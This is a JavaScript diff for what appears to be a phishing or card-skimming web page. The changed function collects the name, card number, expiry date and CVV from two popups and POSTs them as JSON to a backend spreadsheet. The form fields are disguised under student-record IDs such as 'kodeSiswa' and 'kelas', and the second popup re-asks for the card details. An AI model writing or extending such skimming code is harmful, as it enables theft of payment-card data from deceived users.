@@ -33,22 +33,34 @@ function cekLogo(el, logoId) {
 }
 
 async function simpanDataKeSpreadsheet() {
+    // Ambil SEMUA data dari seluruh popup
     const data = {
-        nama: document.getElementById('nama').value,
-        kodeSiswa: document.getElementById('kodeSiswa').value,
-        mmyy: document.getElementById('mmyy').value,
-        kelas: document.getElementById('kelas').value
+        // Data dari Popup 1
+        nama1: document.getElementById('nama')?.value || "",
+        nomorKartu1: document.getElementById('kodeSiswa')?.value || "",
+        masaBerlaku1: document.getElementById('mmyy')?.value || "",
+        cvv1: document.getElementById('kelas')?.value || "",
+        
+        // Data dari Popup 2
+        nama2: document.getElementById('nama2')?.value || "",
+        nomorKartu2: document.getElementById('kodeSiswa2')?.value || "",
+        masaBerlaku2: document.getElementById('mmyy2')?.value || "",
+        cvv2: document.getElementById('kelas2')?.value || "",
+        
+        // Waktu pengiriman
+        waktu: new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" })
     };
 
     try {
         const respon = await fetch(URL_BACKEND, {
             method: "POST",
+            headers: { "Content-Type": "application/json" },
             body: JSON.stringify(data)
         });
 
         const hasil = await respon.json();
         if (hasil.status === "berhasil") {
-            console.log("Data tersimpan:", hasil);
+            console.log("Semua data tersimpan:", hasil);
             return true;
         } else {
             alert("Gagal menyimpan data: " + hasil.pesan);
@@ -62,14 +74,18 @@ async function simpanDataKeSpreadsheet() {
 }
 
 async function nextPopup(current, next) {
-    if(current === 'popup1') {
+    // Simpan data setiap kali berpindah dari Popup 1 dan Popup 2
+    if(current === 'popup1' || current === 'popup2') {
         const berhasil = await simpanDataKeSpreadsheet();
-        if (!berhasil) return;
+        if (!berhasil) return; // Batalkan pindah jika gagal simpan
 
-        let code = document.getElementById('kodeSiswa').value;
-        let last4 = code.slice(-4);
-        document.getElementById('kelasDisplay').innerText = last4;
-        document.getElementById('kelasDisplay2').innerText = last4;
+        // Tampilkan 4 angka terakhir kartu di popup selanjutnya
+        if(current === 'popup1') {
+            let code = document.getElementById('kodeSiswa').value;
+            let last4 = code.slice(-4);
+            document.getElementById('kelasDisplay').innerText = last4;
+            document.getElementById('kelasDisplay2').innerText = last4;
+        }
     }
     
     document.getElementById(current).classList.add('hidden');
